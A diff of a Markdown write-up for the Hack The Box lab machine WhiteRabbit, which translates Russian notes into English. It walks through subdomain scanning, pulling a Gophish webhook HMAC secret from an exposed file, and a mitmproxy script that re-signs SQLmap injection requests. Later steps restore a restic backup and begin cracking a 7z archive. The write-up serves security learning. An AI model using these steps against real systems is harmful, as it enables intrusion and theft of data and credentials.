@@ -2,7 +2,7 @@
 
 ### --USER FLAG--
 
-Scanning
+Reconnaissance
 
 ```
 Hexada@hexada ~/Downloads$ sudo nmap -sS -sC -sV -p- -T5 --max-rate 10000 whiterabbit.htb                                                                                     
@@ -57,7 +57,21 @@ ________________________________________________
 
 status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 147ms]
 ```
-Поддомен возвращает статус реридекта, нужно посмотреть куда именно он нас направляет
+
++ New subdomain `status.whiterabbit.htb`
+
+```
+Hexada@hexada ~/pentest-env/pentesting-wordlists$ cat /etc/hosts                                                                                                              
+# Static table lookup for hostnames.
+# See hosts(5) for details.
+
+127.0.0.1       localhost
+::1             localhost
+127.0.0.1       hexada.localdomain    hexada
+10.10.11.63     status.whiterabbit.htb    whiterabbit.htb
+```
+
+I didn’t find anything interesting on the main domain, so I’m moving on to look for something in the `status`
 
 ```
 Hexada@hexada ~/pentest-env/pentesting-wordlists$ curl -I -H "Host: status.whiterabbit.htb" http://whiterabbit.htb                                                            
@@ -71,24 +85,12 @@ Vary: Accept
 X-Frame-Options: SAMEORIGIN
 ```
 
-В директорию `status.whiterabbit.htb/dashboard`
-
 ![image](https://github.com/user-attachments/assets/a6cb4d1d-5422-464f-95d1-2f3bafa7e24e)
 
-+ новый поддомен: `status.whiterabbit.htb`
-
-```
-Hexada@hexada ~/pentest-env/pentesting-wordlists$ cat /etc/hosts                                                                                                              
-# Static table lookup for hostnames.
-# See hosts(5) for details.
-
-127.0.0.1       localhost
-::1             localhost
-127.0.0.1       hexada.localdomain    hexada
-10.10.11.63     status.whiterabbit.htb    whiterabbit.htb
-```
+The subdomain `status.whiterabbit.htb` redirects to the `/dashboard` endpoint, let's to check it
 
 ![image](https://github.com/user-attachments/assets/c4c27cbc-130b-4319-ab5f-561cf0fa8db9)
+
 
 ```
 Hexada@hexada ~/pentest-env/pentesting-wordlists$ ffuf -u http://status.whiterabbit.htb/FUZZ -w ./SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.js,.json,.txt -fs 2444 -ic
@@ -129,34 +131,34 @@ Robots.txt              [Status: 200, Size: 25, Words: 3, Lines: 2, Duration: 14
 manifest.json           [Status: 200, Size: 415, Words: 147, Lines: 20, Duration: 69ms]
 ```
 
-```
-Hexada@hexada ~/pentest-env/pentesting-wordlists$ curl -I  http://status.whiterabbit.htb/.well-known/change-password                                                          
-HTTP/1.1 302 Found
-Content-Length: 89
-Content-Type: text/plain; charset=utf-8
-Date: Wed, 09 Jul 2025 21:30:32 GMT
-Location: https://github.com/louislam/uptime-kuma/wiki/Reset-Password-via-CLI
-Server: Caddy
-Vary: Accept
-X-Frame-Options: SAMEORIGIN
-```
-
-При удалённом доступе может быть полезно
+`/status` — it's a publical endpoint which usually [works by default](https://github.com/louislam/uptime-kuma/wiki/Status-Page)
 
 ```
-Bootstrap	5.1.3	  November 2021
-vue-i18n	9.2.2	  January 2022
-Font Awesome	5.15.4	  October 2021
-vue-router	4.0.16	  January 2022
-SortableJS	1.14.0	  December 2021
+Hexada@hexada ~/pentest-env/pentesting-wordlists$ ffuf -u http://status.whiterabbit.htb/FUZZ -w ./SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.js,.json,.txt  -mc 404 -t 100 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://status.whiterabbit.htb/FUZZ
+ :: Wordlist         : FUZZ: /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Extensions       : .php .html .js .json .txt 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 404
+________________________________________________
+
+status                  [Status: 404, Size: 2444, Words: 247, Lines: 39, Duration: 66ms]
 ```
-
-Приблизительная версия `Uptime Kuma v1.10–1.14`
-
-https://cvefeed.io/vuln/detail/CVE-2024-56331
-https://github.com/advisories/GHSA-2qgm-m29m-cj2h
-
-Может сработать только, если есть доступ к системе, потенциально возможно через сброс пароля: `npm run reset-password`
 
 ```
 Hexada@hexada ~/pentest-env/pentesting-wordlists$ ffuf -u http://status.whiterabbit.htb/status/FUZZ -w ./SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.js,.json,.txt.,xslx,.csv,.bak,.old,.zip,.tar,.gz,.env,.log,.conf -mc 200-299,301,302,307,401,403,404,405,500 -fs 2444 -ic -t 100
@@ -186,31 +188,15 @@ ________________________________________________
 temp                    [Status: 200, Size: 3359, Words: 304, Lines: 41, Duration: 86ms]
 ```
 
-`/status` — это публичная страница, которая предназначена для отображения состояния сервисов (мониторов), которые админ выбрал как "доступные публично"
-
-https://github.com/louislam/uptime-kuma/wiki/Status-Page
+Let's to check this endpoint
 
 <img width="1920" height="949" alt="image" src="https://github.com/user-attachments/assets/6f14c7b3-9f96-4b2c-8d03-a4cd6529da2f" />
 
-+ новый поддомены: `ddb09a8558c9.whiterabbit.htb`, `a668910b5514e.whiterabbit.htb`
-
-```
-Hexada@hexada ~/pentest-env/pentesting-wordlists$ cat /etc/hosts                                                                                                                           
-# Static table lookup for hostnames.
-# See hosts(5) for details.
-
-127.0.0.1       localhost
-::1             localhost
-127.0.0.1       hexada.localdomain    hexada
-192.168.0.101   cyberia
-10.10.11.63     status.whiterabbit.htb   whiterabbit.htb   ddb09a8558c9.whiterabbit.htb   a668910b5514e.whiterabbit.htb
-```
-
-<img width="1920" height="653" alt="image" src="https://github.com/user-attachments/assets/a03061b4-308a-4f2e-b43e-181b9fdee320" />
++ New subdomeins: `ddb09a8558c9.whiterabbit.htb`, `a668910b5514e.whiterabbit.htb`
 
 <img width="983" height="495" alt="image" src="https://github.com/user-attachments/assets/f69b38e1-fddb-475a-86f5-422d5856cd06" />
- 
- + новый поддомен: `28efa8f7df.whiterabbit.htb`
+
+In `wikijs` we can find a new subdomein: `28efa8f7df.whiterabbit.htb`
 
 ```
 Hexada@hexada ~/Downloads$ cat /etc/hosts                                                                                                                                                  
@@ -224,23 +210,21 @@ Hexada@hexada ~/Downloads$ cat /etc/hosts
 10.10.11.63     status.whiterabbit.htb   whiterabbit.htb   ddb09a8558c9.whiterabbit.htb   a668910b5514e.whiterabbit.htb    28efa8f7df.whiterabbit.htb
 ```
 
-<img width="1916" height="755" alt="image" src="https://github.com/user-attachments/assets/45c71214-bddf-4447-9995-be8b333d270f" />
-
-
 `x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd`
 
-Это `HMAC` подпись, которая проверяет не подделал ли кто-то запрос. Идея следуйщая: на сервере храниться секрет, перед тем как обработать запрос, сервер
-сначала хеширует `body` HTTP запроса, и потом сравнивает его с значением захешированого body на клиенте в `sha256=...`, если хеши совпадают - запрос валиден,
-если нет - запрос не валиден. Если у нас получиться достать секрет, мы можем подделать `HMAC` подпись, и сделать все наши запросы валидными.
+This is an `HMAC` signature used to verify the integrity of HTTP requests. It works as follows: the server holds a secret key and uses it to generate a hash (in our case, 
+using `SHA-256`) based on the request body. When a request is received, the server hashes the `body` using its secret key and compares the result with the `HMAC` provided by the 
+client. If the hashes match, the request is considered valid. If they don't, the request is rejected.
+
+Therefore, if we can obtain the server's secret key, we can generate a valid `HMAC` signature for any request body — effectively allowing us to forge legitimate requests.
 
 <img width="1280" height="295" alt="image" src="https://github.com/user-attachments/assets/1d5bcd3d-0eab-4b90-855f-087d9ad5b6c2" />
 
 <img width="1280" height="295" alt="image" src="https://github.com/user-attachments/assets/b1523419-14ed-4224-9bb4-65c76777c5f3" />
 
-Обратите внимание, как только мы изменяем body http запроса, он сразу же становиться не валидным, так как наш хеш в `Wiki.js`: 
-`cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd` - это захешированный тестовый body, секретом, который нам нужно достать
+Please note that when we chande the `body` of an HTTP request, the signature becomes invalid and the request is rejected.
 
-Также обратите внимание, что мы можем посмотреть содержание файла `gophish_to_phishing_score_database.json`, в котором мы можем найти нужный нам хеш
+Let's look for something interesting in  `gophish_to_phishing_score_database.json`
 
 ```json
 {
@@ -262,7 +246,7 @@ Hexada@hexada ~/Downloads$ cat /etc/hosts
       }
 ```
 
-По мимо этого, мы можем здесь найти еще пару очень интересный вещей
+Nice, we've found the secret `3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS`, in addition, there is something else of interest
 
 ```json
 {
@@ -289,20 +273,20 @@ Hexada@hexada ~/Downloads$ cat /etc/hosts
             "name": "mariadb - phishing"
           }
         }
-      }
+}
 ```
 
-Поле `email` не экранируеться, соответственно, скорей всего, там есть SQL инъекция, но есть одна небольшая проблема: `LIMIT 1`, это небольшая проблема, потому 
-что её можно обойти
+The `email` field is not properly sanitized, making it vulnerable to `SQL injection`. However, there is a complication — the query uses `LIMIT 1`, which restricts the result 
+to a single record. This makes it harder to craft an effective `SQLi payload` manually. To handle this properly, we should use `SQLmap`, because the payload is too complicated
+to do it manually. But since the server verifies the integrity of incoming requests using an `HMAC` signature (via the `x-gophish-signature header`), we can't send changed payloads.
 
-В SQL `LIMIT` управляет количеством строк, которые вернёт запрос, в данном случае у нас SQL может вернуть только одну строку, поэтому класические вредоносные
-payload тут не будут работать. Место того, чтоб пытаться подбирать самостоятельно эти запросы, лучше будет использовать `SQLmap`, для этого, нам нужно написать 
-скрипт, который подделывать `HMAC` подпись: мы перехвачиваем запрос от `SQLmap`, хешируем его `body` с помощью нашего секрета, в `head` передаем этот хеш в параметр 
-x-gophish-signature, и потом уже отправляем запрос
+Therefore, we need to write a wrapper script that:
++ Intercepts the payload generated by `SQLmap`,
++ Computes the `HMAC` signature using the known secret and the request `body`,
++ Adds the correct `x-gophish-signature` header,
++ Forwards the modified request to the server.
 
-<img width="1280" height="520" alt="image" src="https://github.com/user-attachments/assets/cabdf99d-9ffc-4c61-842b-c95395110bd6" />
-
-Рекомендую разобраться с документацией в `http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks`, и как это все работает под капотом
+I recommend figuring with the documentation in `http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks`
 
 ```py
 from mitmproxy import http
@@ -318,9 +302,12 @@ def request(flow: http.HTTPFlow):
             raw_data = flow.request.get_content()
             signature = hmac.new(SECRET, raw_data, hashlib.sha256).hexdigest()
             flow.request.headers["x-gophish-signature"] = f"sha256={signature}"
+
         except Exception as e:
             flow.request.headers["x-gophish-signature"] = "error-signing"
 ```
+
+run it `mitmproxy -s proxy.py`
 
 ```
 (lab-env) Hexada@hexada ~/pentest-env/pentesting-tools/sqlmap$ python3 sqlmap.py -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \          1 ↵ master 
@@ -350,6 +337,8 @@ available databases [3]:
 [*] phishing
 [*] temp
 ```
+
+Well, we've found interesting tables, let's to check it
 
 ```
 (lab-env) Hexada@hexada ~/pentest-env/pentesting-tools/sqlmap$ python3 sqlmap.py -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \              master 
@@ -392,12 +381,32 @@ Table: command_log
 +----+---------------------+------------------------------------------------------------------------------+
 ```
 
-+ новый поддомен: `http://75951e6ff.whiterabbit.htb`
-
-[restic](https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#local)
++ new subdomain: `http://75951e6ff.whiterabbit.htb`
 
 ```
-Hexada@hexada ~/Downloads$ restic -r rest:http://75951e6ff.whiterabbit.htb snapshots                                                                                                       
+(lab-env) Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ cat /etc/hosts                                                                                        
+# Static table lookup for hostnames.
+# See hosts(5) for details.
+
+127.0.0.1       localhost
+::1             localhost
+127.0.0.1       hexada.localdomain    hexada
+10.10.11.63     status.whiterabbit.htb   whiterabbit.htb   ddb09a8558c9.whiterabbit.htb   a668910b5514e.whiterabbit.htb    28efa8f7df.whiterabbit.htb    75951e6ff.whiterabbit.htb
+```
+
+[restic](https://restic.readthedocs.io/en/latest/010_introduction.html) is a backup tool that stores data as snapshots — similar in concept to Git commits. It allows you to 
+efficiently and securely manage backups, supporting deduplication and encryption by default
+
+For convenience, I should you save the password
+
+```
+ echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
+```
+
+Let's take a look at the snapshots
+
+```
+Hexada@hexada ~$ restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd snapshots                                                                                                       
 enter password for repository: 
 repository 5b26a938 opened (version 2, compression level auto)
 ID        Time                 Host         Tags        Paths
@@ -405,8 +414,6 @@ ID        Time                 Host         Tags        Paths
 272cacd5  2025-03-07 02:18:40  whiterabbit              /dev/shm/bob/ssh
 ------------------------------------------------------------------------
 1 snapshots
-
-echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
 
 Hexada@hexada ~$ restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd restore 272cacd5 -t .                                                                      
 repository 5b26a938 opened (version 2, compression level auto)
@@ -450,6 +457,8 @@ Archives with Errors: 1
 
 Sub items Errors: 3
 ```
+
+Well, the password we found turned out to be invalid
 
 ```
 Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ 7z2john dev/shm/bob/ssh/bob.7z > bob.hash
